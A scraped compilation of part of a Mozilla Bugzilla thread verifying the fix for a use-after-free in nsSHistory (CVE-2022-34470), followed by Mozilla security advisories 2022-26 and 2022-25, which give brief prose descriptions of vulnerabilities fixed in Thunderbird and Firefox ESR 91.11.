|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1765951#c25)• 3 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr91/rev/26781ac8c675>

[status-firefox-esr91](/buglist.cgi?f1=cf_status_firefox_esr91&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=fixed)

|  | [Camelia Badau [:cbadau], Desktop Test Engineering](/user_profile?user_id=500622) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4226411_500622)• 3 years ago |

Flags: qe-verify+

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1765951#c26)• 3 years ago |
|  | |

Can confirm that with the patch the UAF seems no longer reproducible on my end either.

|  | [Camelia Badau [:cbadau], Desktop Test Engineering](/user_profile?user_id=500622) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4241407_500622)• 3 years ago |

QA Whiteboard: [qa-triaged]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a4613671_1689)• 3 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Ciprian Georgiu, Desktop QA](/user_profile?user_id=576182) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1765951#c27)• 3 years ago |
|  | |

I've reproduced this crash using STR from [comment 8](/show_bug.cgi?id=1765951#c8 "VERIFIED FIXED - heap-use-after-free in nsSHistory"), on an affected asan ESR 91.10.0 build.

The bug is verified as fixed on the latest asan builds: ESR 91.11, Beta 102.0b9 and latest Nightly 103.0a1.

Status: RESOLVED → VERIFIED
[status-firefox102](/buglist.cgi?f1=cf_status_firefox102&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox102&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox102&o1=equals&v1=verified)
[status-firefox103](/buglist.cgi?f1=cf_status_firefox103&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox103&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox103&o1=equals&v1=verified)
[status-firefox-esr91](/buglist.cgi?f1=cf_status_firefox_esr91&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=verified)Flags: qe-verify+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a5222595_578488)• 3 years ago |

Whiteboard: STR in comment 8 → [STR in comment 8][adv-main102+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1765951#c28)• 3 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9282644)
— [Details](attachment.cgi?id=9282644&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a5473937_578488)• 3 years ago |

Whiteboard: [STR in comment 8][adv-main102+] → [STR in comment 8][adv-main102+][adv-esr91.11+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a5477180_578488)• 3 years ago |

Alias: CVE-2022-34470

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a23313003_1689)• 2 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a66474804_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1765951&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_da77736f_20250115_102745.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2022-26

## Security Vulnerabilities fixed in Thunderbird 91.11 and Thunderbird 102

Announced
June 28, 2022
Impact
high
Products
Thunderbird
Fixed in

* Thunderbird 102
* Thunderbird 91.11

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*
*Note*: While [Bug 1771084](https://bugzilla.mozilla.org/show_bug.cgi?id=1771084) does not represent a specific vulnerability that was fixed, we recommend anyone rebasing patches to include it. 102 branch: Patch [1](https://hg.mozilla.org/releases/mozilla-beta/rev/82e3067ad2e7) and [2](https://hg.mozilla.org/releases/mozilla-beta/rev/6e4639dc3614). 91 Branch: Patch [1](https://hg.mozilla.org/releases/mozilla-esr91/rev/72bca7a337e4) and [2](https://hg.mozilla.org/releases/mozilla-esr91/rev/befef01949f2) (Despite saying Parts 2 and 3, there is no Part 1)

#### [#CVE-2022-34479: A popup window could be resized in a way to overlay the address bar with web content](#CVE-2022-34479)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A malicious website that could create a popup could have resized the popup to overlay the address bar with its own content, resulting in potential user confusion or spoofing attacks.
*This bug only affects Thunderbird for Linux. Other operating systems are unaffected.*

##### References

* [Bug 1745595](https://bugzilla.mozilla.org/show_bug.cgi?id=1745595)

#### [#CVE-2022-34470: Use-after-free in nsSHistory](#CVE-2022-34470)

Reporter
Armin Ebert
Impact
high
##### Description

Session history navigations may have led to a use-after-free and potentially exploitable crash.

##### References

* [Bug 1765951](https://bugzilla.mozilla.org/show_bug.cgi?id=1765951)

#### [#CVE-2022-34468: CSP sandbox header without "allow-scripts" can be bypassed via retargeted javascript: URI](#CVE-2022-34468)

Reporter
Armin Ebert
Impact
high
##### Description

An iframe that was not permitted to run scripts could do so if the user clicked on a `javascript:` link.

##### References

* [Bug 1768537](https://bugzilla.mozilla.org/show_bug.cgi?id=1768537)

#### [#CVE-2022-2226: An email with a mismatching OpenPGP signature date was accepted as valid](#CVE-2022-2226)

Reporter
Nickolay Olshevsky
Impact
moderate
##### Description

An OpenPGP digital signature includes information about the date when the signature was created. When displaying an email that contains a digital signature, the email's date will be shown. If the dates were different, then Thunderbird didn't report the email as having an invalid signature. If an attacker performed a replay attack, in which an old email with old contents are resent at a later time, it could lead the victim to believe that the statements in the email are current. Fixed versions of Thunderbird will require that the signature's date roughly matches the displayed date of the email.

##### References

* [Bug 1775441](https://bugzilla.mozilla.org/show_bug.cgi?id=1775441)

#### [#CVE-2022-34481: Potential integer overflow in ReplaceElementsAt](#CVE-2022-34481)

Reporter
Ronald Crane
Impact
moderate
##### Description

In the `nsTArray_Impl::ReplaceElementsAt()` function, an integer overflow could have occurred when the number of elements to replace was too large for the container.

##### References

* [Bug 1497246](https://bugzilla.mozilla.org/show_bug.cgi?id=1497246)

#### [#CVE-2022-31744: CSP bypass enabling stylesheet injection](#CVE-2022-31744)

Reporter
Gertjan
Impact
moderate
##### Description

An attacker could have injected CSS into stylesheets accessible via internal URIs, such as resource:, and in doing so bypass a page's Content Security Policy.

##### References

* [Bug 1757604](https://bugzilla.mozilla.org/show_bug.cgi?id=1757604)

#### [#CVE-2022-34472: Unavailable PAC file resulted in OCSP requests being blocked](#CVE-2022-34472)

Reporter
Laurent Bigonville
Impact
moderate
##### Description

If there was a PAC URL set and the server that hosts the PAC was not reachable, OCSP requests would have been blocked, resulting in incorrect error pages being shown.

##### References

* [Bug 1770123](https://bugzilla.mozilla.org/show_bug.cgi?id=1770123)

#### [#CVE-2022-34478: Microsoft protocols can be attacked if a user accepts a prompt](#CVE-2022-34478)

Reporter
Gijs
Impact
moderate
##### Description

The `ms-msdt`, `search`, and `search-ms` protocols deliver content to Microsoft applications, bypassing the browser, when a user accepts a prompt. These applications have had known vulnerabilities, exploited in the wild (although we know of none exploited through Thunderbird), so in this release Thunderbird has blocked these protocols from prompting the user to open them.
*This bug only affects Thunderbird on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1773717](https://bugzilla.mozilla.org/show_bug.cgi?id=1773717)

#### [#CVE-2022-2200: Undesired attributes could be set as part of prototype pollution](#CVE-2022-2200)

Reporter
Manfred Paul via Trend Micro's Zero Day Initiative
Impact
moderate
##### Description

If an object prototype was corrupted by an attacker, they would have been able to set undesired attributes on a JavaScript object, leading to privileged code execution.

##### References

* [Bug 1771381](https://bugzilla.mozilla.org/show_bug.cgi?id=1771381)

#### [#CVE-2022-34484: Memory safety bugs fixed in Thunderbird 91.11 and Thunderbird 102](#CVE-2022-34484)

Reporter
Mozilla developers and community
Impact
high
##### Description

The Mozilla Fuzzing Team reported potential vulnerabilities present in Thunderbird 91.10. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 91.11 and Thunderbird 102](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1763634%2C1772651)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_5284e496_20250115_102744.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2022-25

## Security Vulnerabilities fixed in Firefox ESR 91.11

Announced
June 28, 2022
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 91.11

*Note*: While [Bug 1771084](https://bugzilla.mozilla.org/show_bug.cgi?id=1771084) does not represent a specific vulnerability that was fixed, we recommend anyone rebasing patches to include it. 102 branch: Patch [1](https://hg.mozilla.org/releases/mozilla-beta/rev/82e3067ad2e7) and [2](https://hg.mozilla.org/releases/mozilla-beta/rev/6e4639dc3614). 91 Branch: Patch [1](https://hg.mozilla.org/releases/mozilla-esr91/rev/72bca7a337e4) and [2](https://hg.mozilla.org/releases/mozilla-esr91/rev/befef01949f2) (Despite saying Parts 2 and 3, there is no Part 1)

#### [#CVE-2022-34479: A popup window could be resized in a way to overlay the address bar with web content](#CVE-2022-34479)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A malicious website that could create a popup could have resized the popup to overlay the address bar with its own content, resulting in potential user confusion or spoofing attacks.
*This bug only affects Firefox for Linux. Other operating systems are unaffected.*

##### References

* [Bug 1745595](https://bugzilla.mozilla.org/show_bug.cgi?id=1745595)

#### [#CVE-2022-34470: Use-after-free in nsSHistory](#CVE-2022-34470)

Reporter
Armin Ebert
Impact
high
##### Description

Session history navigations may have led to a use-after-free and potentially exploitable crash.

##### References

* [Bug 1765951](https://bugzilla.mozilla.org/show_bug.cgi?id=1765951)

#### [#CVE-2022-34468: CSP sandbox header without "allow-scripts" can be bypassed via retargeted javascript: URI](#CVE-2022-34468)

Reporter
Armin Ebert
Impact
high
##### Description

An iframe that was not permitted to run scripts could do so if the user clicked on a `javascript:` link.

##### References

* [Bug 1768537](https://bugzilla.mozilla.org/show_bug.cgi?id=1768537)

#### [#CVE-2022-34481: Potential integer overflow in ReplaceElementsAt](#CVE-2022-34481)

Reporter
Ronald Crane
Impact
moderate
##### Description

In the `nsTArray_Impl::ReplaceElementsAt()` function, an integer overflow could have occurred when the number of elements to replace was too large for the container.

##### References

* [Bug 1497246](https://bugzilla.mozilla.org/show_bug.cgi?id=1497246)

#### [#CVE-2022-31744: CSP bypass enabling stylesheet injection](#CVE-2022-31744)

Reporter
Gertjan
Impact
moderate
##### Description

An attacker could have injected CSS into stylesheets accessible via internal URIs, such as resource:, and in doing so bypass a page's Content Security Policy.

##### References

* [Bug 1757604](https://bugzilla.mozilla.org/show_bug.cgi?id=1757604)

#### [#CVE-2022-34472: Unavailable PAC file resulted in OCSP requests being blocked](#CVE-2022-34472)

Reporter
Laurent Bigonville
Impact
moderate
##### Description

If there was a PAC URL set and the server that hosts the PAC was not reachable, OCSP requests would have been blocked, resulting in incorrect error pages being shown.

##### References

* [Bug 1770123](https://bugzilla.mozilla.org/show_bug.cgi?id=1770123)

#### [#CVE-2022-34478: Microsoft protocols can be attacked if a user accepts a prompt](#CVE-2022-34478)

Reporter
Gijs
Impact
moderate
##### Description

The `ms-msdt`, `search`, and `search-ms` protocols deliver content to Microsoft applications, bypassing the browser, when a user accepts a prompt. These applications have had known vulnerabilities, exploited in the wild (although we know of none exploited through Firefox), so in this release Firefox has blocked these protocols from prompting the user to open them.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1773717](https://bugzilla.mozilla.org/show_bug.cgi?id=1773717)

#### [#CVE-2022-2200: Undesired attributes could be set as part of prototype pollution](#CVE-2022-2200)

Reporter
Manfred Paul via Trend Micro's Zero Day Initiative
Impact
moderate
##### Description

If an object prototype was corrupted by an attacker, they would have been able to set undesired attributes on a JavaScript object, leading to privileged code execution.

##### References

* [Bug 1771381](https://bugzilla.mozilla.org/show_bug.cgi?id=1771381)

#### [#CVE-2022-34484: Memory safety bugs fixed in Firefox 102 and Firefox ESR 91.11](#CVE-2022-34484)

Reporter
Mozilla developers and community
Impact
high
##### Description

The Mozilla Fuzzing Team reported potential vulnerabilities present in Firefox 101 and Firefox ESR 91.10. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 102 and Firefox ESR 91.11](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1763634%2C1772651)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_f096317f_20250115_102743.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
